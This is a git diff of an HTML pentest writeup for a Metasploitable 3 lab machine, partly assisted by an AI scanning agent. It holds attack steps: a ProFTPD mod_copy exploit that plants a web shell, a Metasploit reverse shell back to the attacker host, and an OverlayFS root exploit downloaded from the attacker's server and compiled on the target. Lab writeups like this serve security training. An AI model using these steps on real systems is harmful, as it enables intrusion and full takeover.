@@ -1,291 +1,290 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Metasploitable 3 — Network Pentest Writeup | Omar Mesalam</title>
-    
-    <!-- Fonts & Icons -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style>
-        :root {
-            --bg-dark: #12161f;
-            --card-bg: rgba(22, 28, 39, 0.85);
-            --border-color: rgba(255, 255, 255, 0.08);
-            --accent-green: #10b981;
-            --accent-blue: #58a6ff;
-            --accent-red: #ff7b72;
-            --accent-yellow: #f2cc60;
-            --accent-purple: #d2a8ff;
-            --accent-glow: rgba(16, 185, 129, 0.15);
-            --text-main: #f1f5f9;
-            --text-sub: #94a3b8;
-            --font-code: 'Fira Code', monospace;
-            --font-sans: 'Inter', sans-serif;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: var(--font-sans);
-            line-height: 1.8;
-            padding-bottom: 60px;
-        }
-
-        .navbar {
-            border-bottom: 1px solid var(--border-color);
-            padding: 16px 0;
-            background: rgba(18, 22, 31, 0.9);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            backdrop-filter: blur(8px);
-        }
-
-        .nav-container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-family: var(--font-code);
-            font-weight: 700;
-            color: var(--text-main);
-            text-decoration: none;
-        }
-
-        .logo-accent { color: var(--accent-green); }
-
-        .back-btn {
-            color: var(--accent-green);
-            text-decoration: none;
-            font-family: var(--font-code);
-            font-size: 0.9rem;
-        }
-
-        .article-container {
-            max-width: 850px;
-            margin: 40px auto;
-            padding: 0 20px;
-        }
-
-        .article-box {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-        }
-
-        .article-header {
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 20px;
-            margin-bottom: 30px;
-        }
-
-        .article-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            line-height: 1.3;
-            margin-bottom: 12px;
-        }
-
-        .article-meta {
-            font-size: 0.85rem;
-            color: var(--text-sub);
-            font-family: var(--font-code);
-            display: flex;
-            gap: 15px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .badge { color: var(--accent-green); }
-
-        .impact-highlights {
-            background: rgba(16, 185, 129, 0.05);
-            border-left: 4px solid var(--accent-green);
-            padding: 15px 20px;
-            margin: 25px 0;
-            border-radius: 0 8px 8px 0;
-        }
-
-        .impact-highlights-warning {
-            background: rgba(242, 204, 96, 0.05);
-            border-left: 4px solid var(--accent-yellow);
-            padding: 15px 20px;
-            margin: 25px 0;
-            border-radius: 0 8px 8px 0;
-        }
-
-        .impact-highlights ul {
-            list-style: none;
-            margin: 0;
-            padding: 0;
-        }
-
-        .impact-highlights li {
-            font-family: var(--font-code);
-            font-size: 0.93rem;
-            color: #e2e8f0;
-            margin-bottom: 5px;
-        }
-
-        .article-body h2 {
-            font-size: 1.3rem;
-            font-family: var(--font-code);
-            color: var(--accent-green);
-            margin: 35px 0 15px 0;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 8px;
-        }
-
-        .port-tag {
-            background-color: var(--accent-green);
-            color: #0d1117;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-family: var(--font-code);
-            font-size: 0.85rem;
-            font-weight: 600;
-        }
-
-        .article-body h3 {
-            font-size: 1.05rem;
-            font-family: var(--font-code);
-            color: var(--accent-purple);
-            margin: 20px 0 10px 0;
-        }
-
-        .article-body p {
-            color: #cbd5e1;
-            font-size: 0.98rem;
-            margin-bottom: 18px;
-        }
-
-        .terminal-box {
-            background: #0d1117;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 15px 20px;
-            font-family: var(--font-code);
-            font-size: 0.88rem;
-            color: #c9d1d9;
-            margin: 20px 0;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-break: break-word;
-        }
-
-        .prompt { color: var(--accent-green); font-weight: bold; }
-        .highlight { color: var(--accent-yellow); }
-        .vulnerability { color: var(--accent-red); font-weight: bold; }
-
-        .tree-box {
-            font-family: var(--font-code);
-            background-color: #0d1117;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 15px;
-            color: var(--accent-blue);
-            font-size: 0.88rem;
-            margin: 20px 0;
-            white-space: pre;
-            overflow-x: auto;
-        }
-
-        .img-container {
-            margin: 25px 0;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.2);
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-        }
-
-        .img-container img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 6px;
-        }
-
-        .conclusion-box {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-            border-radius: 8px;
-            margin-top: 30px;
-            font-family: var(--font-code);
-            font-size: 0.85rem;
-            color: var(--text-sub);
-            font-style: italic;
-        }
-
-        code {
-            font-family: var(--font-code);
-            background: rgba(255, 255, 255, 0.06);
-            padding: 2px 6px;
-            border-radius: 4px;
-            color: var(--accent-green);
-            font-size: 0.9em;
-        }
-
-        ul, ol {
-            margin-bottom: 18px;
-            padding-left: 20px;
-            color: #cbd5e1;
-        }
-
-        li { margin-bottom: 6px; }
-
-        @media (max-width: 600px) {
-            .article-box { padding: 20px; }
-            .article-title { font-size: 1.4rem; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploitable 3 - Network Pentest Writeup | Omar Mesalam</title>
+<!-- Fonts & Icons -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+ 
+<style>
+:root {
+--bg-dark: #12161f;
+--card-bg: rgba(22, 28, 39, 0.85);
+--border-color: rgba(255, 255, 255, 0.08);
+--accent-green: #10b981;
+--accent-blue: #58a6ff;
+--accent-red: #ff7b72;
+--accent-yellow: #f2cc60;
+--accent-purple: #d2a8ff;
+--accent-glow: rgba(16, 185, 129, 0.15);
+--text-main: #f1f5f9;
+--text-sub: #94a3b8;
+--font-code: 'Fira Code', monospace;
+--font-sans: 'Inter', sans-serif;
+}
+ 
+* { margin: 0; padding: 0; box-sizing: border-box; }
+ 
+body {
+background-color: var(--bg-dark);
+color: var(--text-main);
+font-family: var(--font-sans);
+line-height: 1.8;
+padding-bottom: 60px;
+}
+ 
+.navbar {
+border-bottom: 1px solid var(--border-color);
+padding: 16px 0;
+background: rgba(18, 22, 31, 0.9);
+position: sticky;
+top: 0;
+z-index: 100;
+backdrop-filter: blur(8px);
+}
+ 
+.nav-container {
+max-width: 900px;
+margin: 0 auto;
+padding: 0 20px;
+display: flex;
+justify-content: space-between;
+align-items: center;
+}
+ 
+.logo {
+font-family: var(--font-code);
+font-weight: 700;
+color: var(--text-main);
+text-decoration: none;
+}
+ 
+.logo-accent { color: var(--accent-green); }
+ 
+.back-btn {
+color: var(--accent-green);
+text-decoration: none;
+font-family: var(--font-code);
+font-size: 0.9rem;
+}
+ 
+.article-container {
+max-width: 850px;
+margin: 40px auto;
+padding: 0 20px;
+}
+ 
+.article-box {
+background: var(--card-bg);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 40px;
+box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+}
+ 
+.article-header {
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 20px;
+margin-bottom: 30px;
+}
+ 
+.article-title {
+font-size: 1.8rem;
+font-weight: 700;
+line-height: 1.3;
+margin-bottom: 12px;
+}
+ 
+.article-meta {
+font-size: 0.85rem;
+color: var(--text-sub);
+font-family: var(--font-code);
+display: flex;
+gap: 15px;
+align-items: center;
+flex-wrap: wrap;
+}
+ 
+.badge { color: var(--accent-green); }
+ 
+.impact-highlights {
+background: rgba(16, 185, 129, 0.05);
+border-left: 4px solid var(--accent-green);
+padding: 15px 20px;
+margin: 25px 0;
+border-radius: 0 8px 8px 0;
+}
+ 
+.impact-highlights-warning {
+background: rgba(242, 204, 96, 0.05);
+border-left: 4px solid var(--accent-yellow);
+padding: 15px 20px;
+margin: 25px 0;
+border-radius: 0 8px 8px 0;
+}
+ 
+.impact-highlights ul {
+list-style: none;
+margin: 0;
+padding: 0;
+}
+ 
+.impact-highlights li {
+font-family: var(--font-code);
+font-size: 0.93rem;
+color: #e2e8f0;
+margin-bottom: 5px;
+}
+ 
+.article-body h2 {
+font-size: 1.3rem;
+font-family: var(--font-code);
+color: var(--accent-green);
+margin: 35px 0 15px 0;
+display: flex;
+align-items: center;
+gap: 10px;
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 8px;
+}
+ 
+.port-tag {
+background-color: var(--accent-green);
+color: #0d1117;
+padding: 2px 8px;
+border-radius: 4px;
+font-family: var(--font-code);
+font-size: 0.85rem;
+font-weight: 600;
+}
+ 
+.article-body h3 {
+font-size: 1.05rem;
+font-family: var(--font-code);
+color: var(--accent-purple);
+margin: 20px 0 10px 0;
+}
+ 
+.article-body p {
+color: #cbd5e1;
+font-size: 0.98rem;
+margin-bottom: 18px;
+}
+ 
+.terminal-box {
+background: #0d1117;
+border: 1px solid var(--border-color);
+border-radius: 8px;
+padding: 15px 20px;
+font-family: var(--font-code);
+font-size: 0.88rem;
+color: #c9d1d9;
+margin: 20px 0;
+overflow-x: auto;
+white-space: pre-wrap;
+word-break: break-word;
+}
+ 
+.prompt { color: var(--accent-green); font-weight: bold; }
+.highlight { color: var(--accent-yellow); }
+.vulnerability { color: var(--accent-red); font-weight: bold; }
+ 
+.tree-box {
+font-family: var(--font-code);
+background-color: #0d1117;
+border: 1px solid var(--border-color);
+border-radius: 8px;
+padding: 15px;
+color: var(--accent-blue);
+font-size: 0.88rem;
+margin: 20px 0;
+white-space: pre;
+overflow-x: auto;
+}
+ 
+.img-container {
+margin: 25px 0;
+text-align: center;
+background: rgba(0, 0, 0, 0.2);
+padding: 15px;
+border-radius: 8px;
+border: 1px solid var(--border-color);
+}
+ 
+.img-container img {
+max-width: 100%;
+height: auto;
+border-radius: 6px;
+}
+ 
+.conclusion-box {
+background: rgba(255, 255, 255, 0.03);
+border: 1px solid var(--border-color);
+padding: 20px;
+border-radius: 8px;
+margin-top: 30px;
+font-family: var(--font-code);
+font-size: 0.85rem;
+color: var(--text-sub);
+font-style: italic;
+}
+ 
+code {
+font-family: var(--font-code);
+background: rgba(255, 255, 255, 0.06);
+padding: 2px 6px;
+border-radius: 4px;
+color: var(--accent-green);
+font-size: 0.9em;
+}
+ 
+ul, ol {
+margin-bottom: 18px;
+padding-left: 20px;
+color: #cbd5e1;
+}
+ 
+li { margin-bottom: 6px; }
+ 
+@media (max-width: 600px) {
+.article-box { padding: 20px; }
+.article-title { font-size: 1.4rem; }
+}
+</style>
 </head>
 <body>
-
-    <header class="navbar">
-        <div class="nav-container">
-            <a href="../index.html" class="logo"><span class="logo-accent">&gt;</span> Omar Mesalam_</a>
-            <a href="../index.html" class="back-btn">&larr; Back to Writeups</a>
-        </div>
-    </header>
-
-    <div class="article-container">
-        <article class="article-box">
-            
-            <header class="article-header">
-                <h1 class="article-title">Metasploitable 3 — Network Penetration Testing Writeup</h1>
-                <div class="article-meta">
-                    <span class="badge">Omar Mesalam</span>
-                    <span>• Network Pentest</span>
-                    <span>• Vulnerability Assessment & Exploitation</span>
-                </div>
-            </header>
-
-            <div class="article-body">
-                
-                <p>Now we have an IP for machine and we need to do Network pentest for this machine.</p>
-                <p>As the world evolves and AI enters the field of cybersecurity, its best use is to expedite processes, not to perform tasks for us. However, we must understand how it works before resorting to it. Perhaps it's faster, so I might use it occasionally, but I'll explain the prompts to the user and the results.</p>
-                
-                <p>First, I ran a full Nmap scan with service and default script detection to see which ports and services are running on the target manually and with an AI Model.</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
+<header class="navbar">
+<div class="nav-container">
+<a href="../index.html" class="logo"><span class="logo-accent">&gt;</span> Omar Mesalam_</a>
+<a href="../index.html" class="back-btn">&larr; Back to Writeups</a>
+</div>
+</header>
+ 
+<div class="article-container">
+<article class="article-box">
+ 
+<header class="article-header">
+<h1 class="article-title">Metasploitable 3 — Network Penetration Testing Writeup</h1>
+<div class="article-meta">
+<span class="badge">Omar Mesalam</span>
+<span>• Network Pentest</span>
+<span>• Vulnerability Assessment & Exploitation</span>
+</div>
+</header>
+ 
+<div class="article-body">
+ 
+<p><strong>Now we have an Ip for machine and we need to  do Network pentest for this machine</strong></p>
+ 
+<p><strong>As the world evolves and Ai enters the field of cybersecurity, its best use is to expedite processes, not to perform tasks for us. However, we must understand how it works before resorting to it. Perhaps it's faster, so I might use it occasionally, but I'll explain the prompts to the user and the results</strong></p>
+ 
+<p>First, I ran a full Nmap scan with service and default script detection to see which ports and services are running on the target Manuwal and With Ai Model</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> nmap -sV -Pn -sS -p- 192.168.68.130
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-28 23:12 EDT
 Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
@@ -307,21 +306,20 @@ PORT     STATE  SERVICE     VERSION
 8181/tcp closed intermapper
 MAC Address: 00:0C:29:12:1B:CB (VMware)
 Service Info: Hosts: 127.0.2.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 111.95 seconds</div>
-
-                <div class="terminal-box">────────────────────────────────────────
+ 
+<div class="terminal-box">────────────────────────────────────────
 ● scan this targer 192.168.68.130
 Initializing agent...
 ────────────────────────────────────────
-
+ 
   ┊ 💻 preparing terminal…
   ┊ 💻 $         nmap -sV -sC -p- 192.168.68.130  164.9s
-
+ 
 ╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────────────────╮
 Target 192.168.68.130 (Metasploitable3 - Ubuntu 14.04) has the following open ports and services:
-
+ 
 - 21/tcp: FTP (ProFTPD 1.3.5)
 - 22/tcp: SSH (OpenSSH 6.6.1p1)
 - 80/tcp: HTTP (Apache httpd 2.4.7)
@@ -331,42 +329,50 @@ Target 192.168.68.130 (Metasploitable3 - Ubuntu 14.04) has the following open po
 - 3500/tcp: HTTP (WEBrick / Ruby on Rails)
 - 6697/tcp: IRC (UnrealIRCd)
 - 8080/tcp: HTTP (Jetty 8.1.7.v20120910)</div>
-
-                <p>Now we need to test these services.</p>
-
-                <!-- PORT 21 -->
-                <h2><span class="port-tag">PORT 21</span> FTP (ProFTPD 1.3.5)</h2>
-                <p>I think I will give a look for my methodology.</p>
-                <p>Now we will do FTP Banner Grabbing, or simply manually connect to the FTP service and see how the server responds.</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
+ 
+<p>Now we need to test this services</p>
+ 
+<!-- PORT 21 -->
+<h2><span class="port-tag">PORT 21</span> FTP (ProFTPD 1.3.5)</h2>
+ 
+<p>I Think I will give a look For My methology &gt;2</p>
+ 
+<div class="img-container">
+<img src="images/sploit-m3-1.png" alt="Proof of Concept Image 1">
+</div>
+ 
+<p>Now we will do FTP Banner Grabbing, or simply we will manually connect to the FTP service and see how the server responds.</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> nc -nv 192.168.68.130 21
 (UNKNOWN) [192.168.68.130] 21 (ftp) open
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.68.130]</div>
-
-                <p>Now we know some things:</p>
-                <ul>
-                    <li>Port 21 is open, the FTP Server is named ProFTPD, its version is 1.3.5, and the server is ready for requests.</li>
-                    <li><code>(ProFTPD Default Installation)</code>: This usually indicates that the server is running with default or near-default settings.</li>
-                </ul>
-
-                <p>This is something that should catch the pentester's attention, because default installations sometimes contain insecure settings such as anonymous access, weak configuration, unnecessary features, default accounts, and weak permissions. However, a default installation doesn't automatically mean there's a vulnerability.</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
+ 
+<h3>Now We know Some things:</h3>
+<ul>
+<li>Port 21 is open, the FTP Server is named ProFTPD and its version is 1.3.5, and the server is ready for requests.</li>
+<li>(ProFTPD Default Installation)
+This usually indicates that the server is running with default or near-default settings.
+This is something that should catch the pentester's attention, because default installations sometimes contain insecure settings, such as: anonymous access, weak configuration, unnecessary features, default accounts, and weak permissions. However, a default installation doesn't automatically mean there's a vulnerability.</li>
+</ul>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> nmap -p 21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 192.168.68.130
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-28 23:25 EDT
 Nmap scan report for 192.168.68.130
 Host is up (0.00030s latency).
-
+ 
 PORT   STATE SERVICE
 21/tcp open  ftp
 MAC Address: 00:0C:29:12:1B:CB (VMware)
-
+ 
 Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds</div>
-
-                <p>We use this command when we find FTP on Port 21 and want to perform automated enumeration and vulnerability checks on the service instead of checking everything manually. The result here indicates that FTP is working on port 21 and is open, and the NSE scripts selected didn't yield a clear finding. Now we'll focus on determining the version and configuration and performing further enumeration.</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
+ 
+<p>We use this command when we find an FTP on Port 21 and want to perform automated enumeration and vulnerability checks on the service, instead of checking everything manually.</p>
+ 
+<p>The result here indicates that FTP is working on port 21 and is open, and the NSE scripts I selected didn't yield a clear finding. Now we'll focus on determining the version and configuration and performing further enumeration.</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> searchsploit ProFTPD 1.3.5
 -----------------------------------------------------------------------------------
  Exploit Title                                                 |  Path
@@ -375,16 +381,20 @@ ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)    | linux/remote/3726
 ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution          | linux/remote/36803.py
 ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)      | linux/remote/49908.py
 ProFTPd 1.3.5 - File Copy                                    | linux/remote/36742.txt
-------------------------------------------------------------------------------------</div>
-
-                <p>We use SearchSploit to quickly search for known public exploits for the version we found and see if there is anything worth checking. When searching online, we found an exploit script for <code>CVE-2015-3306</code> specific to ProFTPD 1.3.5.</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
+------------------------------------------------------------------------------------
+Shellcodes: No Results
+Papers: No Results</div>
+ 
+<p>We use this command to quickly search for known public exploits for the version we found and see if there is anything worth checking during the pentest.</p>
+ 
+<p>When we searched on Google, we found an exploit code for the CVE-2015-3306 vulnerability specific to ProFTPD 1.3.5</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> nano exploit.py
-
+ 
 <span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> chmod 700 exploit.py
-
+ 
 <span class="prompt">┌──(root㉿omar)-[/home/mesalam/Metasploitable3]</span>
 <span class="prompt">└─#</span> python3 exploit.py --host 192.168.68.130 --port 21 --path "/var/www/html/"
 [+] CVE-2015-3306 exploit by t0kx
@@ -392,47 +402,79 @@ ProFTPd 1.3.5 - File Copy                                    | linux/remote/3674
 [+] Target exploited, acessing shell at http://192.168.68.130/backdoor.php
 [+] Running whoami: www-data
 [+] Done</div>
-
-                <p>ProFTPD was successfully exploited using <a href="https://github.com/t0kx/exploit-CVE-2015-3306" target="_blank" style="color:var(--accent-blue);">exploit-CVE-2015-3306</a>, Remote Command Execution was obtained via web shell, and the commands are currently executing under the <code>www-data</code> account. We can also execute it via Metasploit Framework:</p>
-
-                <div class="terminal-box">msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+ 
+<p>Reference: <a href="https://github.com/t0kx/exploit-CVE-2015-3306">https://github.com/t0kx/exploit-CVE-2015-3306</a></p>
+ 
+<p>ProFTPD was successfully exploited, Remote Command Execution was obtained via web shell, and the commands are currently being executed with the www-data account.</p>
+ 
+<p>We can also search for it in metasploit framework and try it</p>
+ 
+<div class="terminal-box">msf exploit(unix/ftp/proftpd_modcopy_exec) > run
 [*] Started reverse TCP handler on 192.168.68.128:4444
 [*] 192.168.68.130:80 - 192.168.68.130:21 - Connected to FTP server
 [*] 192.168.68.130:80 - 192.168.68.130:21 - Sending copy commands to FTP server
 [*] 192.168.68.130:80 - Executing PHP payload /DRZT4w.php
 [+] 192.168.68.130:80 - Deleted /var/www/html/DRZT4w.php
 [*] Command shell session 1 opened (192.168.68.128:4444 -> 192.168.68.130:41419) at 2026-08-29 00:02:22 -0400
-
 msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1
 [*] Starting interaction with 1...
-
+ 
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
-
-                <h3>Initial Access & Shell Stabilization</h3>
-                <p>Now we will attempt privilege escalation on the system.</p>
-
-                <div class="terminal-box">clear
+ 
+<div class="impact-highlights">
+<ul>
+<li>Initial Access Access On Server ✅</li>
+</ul>
+</div>
+ 
+<p>Now we will try to privileges escalation on the system.</p>
+ 
+<div class="terminal-box">clear
 TERM environment variable not set.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@metasploitable3-ub1404:/var/www/html$ export TERM=xterm
-www-data@metasploitable3-ub1404:/var/www/html$ stty rows 40 columns 120</div>
-
-                <p><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> converts the raw shell to a semi-interactive Bash environment. <code>export TERM=xterm</code> sets the terminal type, and <code>stty rows 40 columns 120</code> adjusts dimensions to prevent broken command outputs.</p>
-
-                <div class="terminal-box">www-data@metasploitable3-ub1404:/var/www/html$ uname -a
-Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</div>
-
-                <p>Checking kernel details reveals an outdated Linux kernel version (3.13.0-24-generic), which is known to be vulnerable to OverlayFS privilege escalation (CVE-2015-1328).</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/alpha]</span>
+www-data@metasploitable3-ub1404:/var/www/html$ stty rows 40 columns 120
+stty rows 40 columns 120
+www-data@metasploitable3-ub1404:/var/www/html$</div>
+ 
+<p><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> converts the raw shell to a semi-interactive Bash environment. Then: <code>export TERM=xterm</code> specifies the terminal type, so <code>clear</code> and other terminal commands should work And this: <code>stty rows 40 columns 120</code> adjusts the terminal dimensions to prevent the output from being broken.</p>
+ 
+<p>We currently have limited privileges and our goal is to gain root access, so please perform some enumeration</p>
+ 
+<div class="terminal-box">www-data@metasploitable3-ub1404:/var/www/html$ uname -a
+uname -a
+Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu
+ SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</div>
+ 
+<p><code>uname -a</code> is a very simple command; its function is to get information about the Linux kernel and the system, such as whether the kernel is old or has a CVE that allows us to escalate privileges.</p>
+ 
+<div class="img-container">
+<img src="images/sploit-m3-2.png" alt="Proof of Concept Image 2">
+</div>
+ 
+<p>Its agood new to try this cve maybe we can take root acces from it</p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/alpha]</span>
 <span class="prompt">└─#</span> python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-192.168.68.130 - - [30/Aug/2026 17:03:05] "GET /ofs.c HTTP/1.1" 200 -</div>
-
-                <div class="terminal-box">www-data@metasploitable3-ub1404:/tmp$ gcc ofs.c -o ofs
+192.168.68.1 - - [30/Aug/2026 17:02:30] "GET / HTTP/1.1" 200 -
+192.168.68.1 - - [30/Aug/2026 17:02:31] code 404, message File not found
+192.168.68.1 - - [30/Aug/2026 17:02:31] "GET /favicon.ico HTTP/1.1" 404 -
+192.168.68.130 - - [30/Aug/2026 17:03:05] "GET /ofs.c HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.</div>
+ 
+<p>I tried to download the exploit file onto my device and then transfer it to the victim's device, and it worked.</p>
+ 
+<p>First, we searched for gcc --version to see if we could run the file or not, and thankgod we found it.</p>
+ 
+<div class="terminal-box">www-data@metasploitable3-ub1404:/tmp$ gcc ofs.c -o ofs
+gcc ofs.c -o ofs
 www-data@metasploitable3-ub1404:/tmp$ chmod +x ofs
+chmod +x ofs
 www-data@metasploitable3-ub1404:/tmp$ ./ofs
+./ofs
 spawning threads
 mount #1
 mount #2
@@ -440,175 +482,610 @@ child threads done
 /etc/ld.so.preload created
 creating shared library
 # id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)</div>
-
-                <div class="impact-highlights">
-                    <ul>
-                        <li>Root Access Gained via OverlayFS Kernel Exploit ✅</li>
-                    </ul>
-                </div>
-
-                <!-- PORT 22 -->
-                <h2><span class="port-tag">PORT 22</span> SSH (OpenSSH 6.6.1p1)</h2>
-                <p>Scanning port 22 to check if SSH is running and identify its version:</p>
-
-                <div class="terminal-box">────────────────────────────────────────
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+#</div>
+ 
+<div class="impact-highlights">
+<ul>
+<li>Root Access Gained ✅</li>
+</ul>
+</div>
+ 
+<!-- PORT 22 -->
+<h2><span class="port-tag">PORT 22</span> SSH (OpenSSH 6.6.1p1)</h2>
+ 
+<p>I started by scanning port 22 to check if SSH is running and to identify its version.</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
 ● scan this targer 192.168.68.130 for port 22
 ────────────────────────────────────────
-
+ 
   ┊ 💻 preparing terminal…
   ┊ 💻 $         nmap -sV -sC -p 22 192.168.68.130  6.3s
-
+ 
 ╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────────────────╮
 Port 22 on 192.168.68.130 is open:
 - Service: SSH (OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13)
 - Protocols: protocol 2.0
-- Host keys: DSA, RSA, ECDSA, ED25519</div>
-
-                <p>Searching for known CVEs associated with OpenSSH 6.6.1p1:</p>
-
-                <div class="terminal-box">────────────────────────────────────────
+- Host keys: DSA, RSA, ECDSA, ED25519
+╰────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+ ⚕ gemini-flash-lite-latest │ 9.24K/1M │ [░░░░░░░░░░] 1% │ ◷ 1.9s │ ↑ 50 t/s │ . ─ Scan target 192.168.68.130
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ Research this topic and write me a brief</div>
+ 
+<p>Port 22 is open, and we found SSH running with OpenSSH 6.6.1p1 on Ubuntu. So now I'm gonna check the SSH service and see if there's anything useful I can enumerate or exploit.</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
 ● search about CVE for port 22 for 192.168.68.130
 ────────────────────────────────────────
-
+ 
   ┊ 💻 preparing terminal…
   ┊ 💻 $         searchsploit openssh 6.6.1  1.1s
-
+ 
 ╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────────────────╮
 OpenSSH 6.6.1p1 on this target is not vulnerable to remote code execution (RCE) flaws. The known vulnerabilities and exploits associated with this version are limited to:
-1. Username Enumeration (CVE-2018-15473): Allows checking valid usernames via timing differences.
-2. Local Privilege Escalation / Info Disclosure (&lt; 7.4): Requires local access or specific misconfigurations.</div>
-
-                <p>Attempting SSH username enumeration using Metasploit auxiliary module:</p>
-
-                <div class="terminal-box">msf > use auxiliary/scanner/ssh/ssh_enumusers
+ 
+1. Username Enumeration (CVE-2018-15473): Allows an attacker to check if specific usernames exist on the system based on timing or response differences during authentication.
+2. Local Privilege Escalation / Information Disclosure (< 7.4): Requires local access or specific misconfigurations (such as disabled privilege separation or agent forwarding misuse).</div>
+ 
+<p>I searched for known CVEs for this OpenSSH version. There's no direct RCE, but CVE-2018-15473 can be used for username enumeration. So the next step is to try enumerating valid usernames and see if we can find one to use for SSH access</p>
+ 
+<p>I will tell him to try exploit it and i will search about it</p>
+ 
+<div class="terminal-box">msf > use auxiliary/scanner/ssh/ssh_enumusers
